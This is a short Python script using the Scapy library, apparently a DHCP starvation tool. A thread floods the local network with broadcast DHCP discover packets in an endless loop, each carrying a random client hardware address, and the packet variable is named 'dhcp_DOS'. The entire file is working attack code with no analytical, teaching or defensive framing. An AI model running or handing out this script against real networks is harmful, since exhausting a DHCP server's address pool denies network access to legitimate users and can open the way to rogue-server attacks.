#!/usr/bin/env python
from scapy.all import *
import threading
def dhcp():
	conf.checkIpaddr= False
	m = RandMAC()
	dhcp_DOS=Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
	sendp(dhcp_DOS, loop=1)
	
process = threading.Thread(target=dhcp)
process.start()
